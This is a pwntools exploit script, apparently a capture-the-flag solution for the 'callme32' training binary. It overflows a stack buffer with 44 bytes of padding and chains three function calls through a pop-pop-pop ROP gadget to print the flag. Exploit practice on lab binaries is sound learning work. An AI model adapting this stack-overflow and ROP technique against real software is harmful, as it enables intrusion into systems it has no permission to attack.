#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux", endian="little")
e = ELF("./callme32")

CALLME_ONE = 0x80485c0
CALLME_TWO = 0x8048620
CALLME_THREE = 0x80485b0
POP_POP_POP = 0x080488a9
ARG = p32(0x1) + p32(0x2) + p32(0x3)
PADDING = "A"*44

PAYLOAD = PADDING + p32(CALLME_ONE) + p32(POP_POP_POP) + ARG + p32(CALLME_TWO) + p32(POP_POP_POP) + ARG + p32(CALLME_THREE) + p32(POP_POP_POP) + ARG

p = process(['./callme32'])
msg = p.recv(timeout=0.1)
print msg

p.sendline(PAYLOAD)
msg = p.recvuntil('}')
print msg

p.close()
